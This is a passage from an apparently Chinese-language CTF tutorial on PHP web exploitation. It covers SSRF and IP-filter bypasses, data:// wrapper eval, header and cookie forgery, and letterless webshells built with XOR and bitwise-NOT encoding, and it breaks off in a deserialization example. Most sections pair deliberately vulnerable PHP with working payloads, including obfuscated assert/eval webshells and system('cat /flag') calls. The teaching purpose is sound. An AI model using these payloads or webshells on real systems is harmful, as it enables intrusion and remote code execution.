<h4 id="data伪协议构造绕过"><a href="#data伪协议构造绕过" class="headerlink" title="data伪协议构造绕过"></a>data伪协议构造绕过</h4><p>data伪协议可以不携带双斜杠，进而下面正则对双斜杠进行了过滤，导致其他伪协议无法使用， 进而无法直接使用php://协议直接读取文件。但是这里使用了eval，对我们读取到的内容进行执行，我们可以使用伪协议构造xss，导致任意代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|\/\/|sftp|ldap|gopher|http|https/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">   $a = file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">   <span class="keyword">eval</span>($a);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;data:text&#x2F;plain;base64,cGhwaW5mbygpOw&#x3D;&#x3D;</span><br><span class="line">#cGhwaW5mbygpOw&#x3D;&#x3D;解码后为phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200716193858963.png" alt="image-20200716193858963"></p>
<h4 id="不存在协议头绕过"><a href="#不存在协议头绕过" class="headerlink" title="不存在协议头绕过"></a>不存在协议头绕过</h4><p>当PHP的 <code>file_get_contents()</code> 在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。</p>
<p>这里是要匹配到http，然后在http后面加上abc，这样的话这个httpabc协议php就识别不了，会当做一个目录，视频里这里的话有点讲错了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#39;&#x2F;^http&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">      die(&quot;no hack&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">echo file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28763&#x2F;?a&#x3D;httpabc:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>

<h4 id="IP限制绕过"><a href="#IP限制绕过" class="headerlink" title="IP限制绕过"></a>IP限制绕过</h4><h5 id="回环地址绕过"><a href="#回环地址绕过" class="headerlink" title="回环地址绕过"></a>回环地址绕过</h5><p>如果IP被限制，拒绝某个IP进行访问，但是只有这个ip访问才能得到ﬂag，这种情况绕过可以使用多种绕过方法。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#39;&#x2F;^(http:\&#x2F;\&#x2F;)?([^\&#x2F;]+)&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">      die(&quot;no hack&quot;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">           echo file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">       &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28284&#x2F;?a&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<h5 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h5><p>虽然这里禁止了127.0.0.1访问，但是localhost代替127.0.0.1绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^(http:\/\/)?([^\/]+)/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^http:\/\/127\.0\.0\.1/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28149&#x2F;?a&#x3D;http:&#x2F;&#x2F;localhost&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<h5 id="特殊IP绕过IP限制"><a href="#特殊IP绕过IP限制" class="headerlink" title="特殊IP绕过IP限制"></a>特殊IP绕过IP限制</h5><p>127.0.0.1的八进制表示为017700000001，当然也存在其他别名2130706433或者0</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28674&#x2F;?a&#x3D;http:&#x2F;&#x2F;017700000001&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<h4 id="get-headers-绕过"><a href="#get-headers-绕过" class="headerlink" title="get_headers 绕过"></a>get_headers 绕过</h4><p>get_headers存在00截断漏洞因此可以使用00截断导致get_headers成功，这一题刚刚视频里忘记讲了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">$host &#x3D; parse_url($url, PHP_URL_HOST); </span><br><span class="line">if(preg_match(&quot;&#x2F;^google\.com$&#x2F;i&quot;, $host) or preg_match(&quot;&#x2F;(.*)\.google\.com$&#x2F;i&quot;, $host))</span><br><span class="line">  &#123;</span><br><span class="line">   $headers &#x3D; get_headers($url,1); </span><br><span class="line">   if(preg_match(&#39;&#x2F;200&#x2F;&#39;, $headers[0]))&#123;</span><br><span class="line">           echo file_get_contents(&quot;&#x2F;flag&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    die(&quot;Only dd working at Google can get the key!&quot;); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28663&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00www.google.com</span><br></pre></td></tr></table></figure>

<h4 id="Curl造成的SSRF"><a href="#Curl造成的SSRF" class="headerlink" title="Curl造成的SSRF"></a>Curl造成的SSRF</h4><h5 id="双url绕过"><a href="#双url绕过" class="headerlink" title="双url绕过"></a>双url绕过</h5><p>由于一次GET传输会先进行URL解码，而SSRF同样支持url解码，因此这里我们可以使用双url编码，这里的话strpos是查找字符串第一次出现的位置，注意字符串位置从 0 开始，也就是flag这个字符串被禁用掉了，我们可以吧a双url编码为%25%36%31，这里输入到浏览器里会变成%2561，其实是一样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b &#x3D; strpos($_GET[&#39;a&#39;], &#39;flag&#39;);</span><br><span class="line">if($b) &#123;</span><br><span class="line">    die(&quot;Bye!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; curl_init();&#x2F;&#x2F;初始化</span><br><span class="line">curl_setopt($c, CURLOPT_URL, $_GET[&#39;a&#39;]);&#x2F;&#x2F;设置url</span><br><span class="line">curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F;获取页面neural</span><br><span class="line">curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);&#x2F;&#x2F;设置超时</span><br><span class="line">echo curl_exec($c);&#x2F;&#x2F;执行curl</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28577&#x2F;?a&#x3D;file:&#x2F;&#x2F;&#x2F;fl%25%36%31g</span><br></pre></td></tr></table></figure>

<h4 id="X-Forwarded-For绕过、Cookie伪造"><a href="#X-Forwarded-For绕过、Cookie伪造" class="headerlink" title="X-Forwarded-For绕过、Cookie伪造"></a>X-Forwarded-For绕过、Cookie伪造</h4><p>如果PHP在使用X-Forwarded-For来获取用户IP的话很可能会造成IP被人为伪造，cookie如果没有 做token校验同样可能被人为伪造造成越权漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;0&quot;, time()+360);</span><br><span class="line">if(@$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]!&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   die(&quot;You are not on the intranet&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> if($_COOKIE[&#39;user&#39;]&#x3D;&#x3D;1)&#123;</span><br><span class="line">   echo file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">        die(&quot;u no admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 39.107.126.173:28989</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: user&#x3D;1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>

<p>抓包改user=1，添加X-Forwarded-For:127.0.0.1，再发送即可。</p>
<h3 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a><strong>无字符绕过</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对传进来的参数<code>shell</code>进行了正则匹配，如果参数中含有<code>a-z</code>，<code>0-9</code>，就无法通过这个<code>if</code>语句。难点就是不包含数字字母的情况下，我们如何去构造出函数，或者是webshell呢。</p>
<h4 id="方法一-异或"><a href="#方法一-异或" class="headerlink" title="方法一(异或)"></a>方法一(异或)</h4><p>什么是异或呢，异或的符号是<code>^</code>，是一种运算符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>如果可以把我们想要的字符它通过两个不是<code>a-z</code>，<code>0-9</code>的字符异或之后得到的话，不久可以绕过这个正则了吗。比如说，我们想要一个字母<code>a</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>echo</code>里面的字符不在<code>a-z</code>，<code>0-9</code>的范畴里面，但是结果等同于<code>a</code></p>
<p>那么我们通过这种方式构造一个<code>phpinfo()</code>试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>

<p>这里你可能看不太懂，<code>%ff%ff%ff%ff^%a0%b8%ba%ab</code>这一大串东西是什么啊。</p>
<p>首先这一大串字符是通过url编码的结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure>

<p>我们将他url解码，再异或得到的是<code>_GET</code>。当然这里的话，你可以将phpinfo换成其他函数。</p>
<p><img src="http://img.kawhi.xyz/image-20200719095020181.png" alt="image-20200719095020181"></p>
<p>那么我们如何构造webshell呢，先看结果。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27cmd%27])</span></span><br></pre></td></tr></table></figure>

<p>这里的方法和上面同理，可以试一下<code>%fe%fe%fe%fe^%a1%b9%bb%aa</code>运算之后是什么结果，构造好webshell可以尝试一下拿蚁剑是否可以连上。</p>
<p><img src="http://img.kawhi.xyz/image-20200719095807318.png" alt="image-20200719095807318"></p>
<p>点击测试连接，如果显示成功就代表你构造成功了。</p>
<p>构造字符脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200724162439697.png" style="high:80%;width:80%;" />

<h4 id="方法二-取反"><a href="#方法二-取反" class="headerlink" title="方法二(取反)"></a>方法二(取反)</h4><p>什么是取反呢，取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p>
<p>这里比较简单，我们直接看如何构造<code>phpinfo()</code>，先看结果。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure>

<p>是怎么得到的呢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200719101835878.png" alt="image-20200719101835878"></p>
<p>如果你仔细看的话，我这里换成了<strong>PHP7.2</strong>的版本，因为<strong>PHP5</strong>并不支持这种表达方式，这一点可以注意一下。</p>
<p>构造webshell，先看结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>什么意思呢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[cmd]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p>接下来用蚁剑连接试一下，这里说一下，我用<strong>PHP7.2</strong>连不上，<strong>PHP7.0</strong>可以连上。</p>
<p><img src="http://img.kawhi.xyz/image-20200719103520386.png" alt="image-20200719103520386"></p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>这里简单介绍了异或和取反两种方法，当然还有其他的方式绕过。想了解更多看下面的连接：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>取反绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">              <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到<code>^</code>被过滤了，尝试采用取反的方式，用上面取反的webshell连接上，在蚁剑的根目录即可找到flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?a=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">9</span>C%<span class="number">92</span>%<span class="number">9</span>B%A2%D6%D6);</span><br><span class="line"><span class="comment">//webshell</span></span><br><span class="line">?a=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)((~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>));</span><br><span class="line"><span class="comment">//system(&#x27;cat /flag&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>16进制异或绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>看到<code>~</code>被过滤了，但是<code>^</code>没有，尝试采用异或的方式。这里的webshell要改一下，因为<code>_</code>和<code>[</code>被过滤了，<code>[</code>的话可以用<code>&#123;</code>代替，<code>_</code>用<code>%a0</code>代替。</p>
<ul>
<li>exp</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a0&#125;($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a1&#125;);&amp;%a0=assert&amp;%a1=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br><span class="line"><span class="comment">//webshell</span></span><br><span class="line">?a=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%<span class="number">20</span>/flag</span><br><span class="line"><span class="comment">//system(&#x27;cat /flag&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>在蚁剑的根目录即可找到flag。</p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><h4 id="序列化和反序列化是什么？"><a href="#序列化和反序列化是什么？" class="headerlink" title="序列化和反序列化是什么？"></a>序列化和反序列化是什么？</h4><blockquote>
<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 ——php官方文档</p>
</blockquote>
<p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p>
<p>举一个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;kawhi&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到其中反序列化的a变量是可控的，并且一旦反序列化会自动执行魔法方法<code>__wakeup</code>并且输出test。</p>
<p>尝试构造序列化代码的时候插入xss</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> 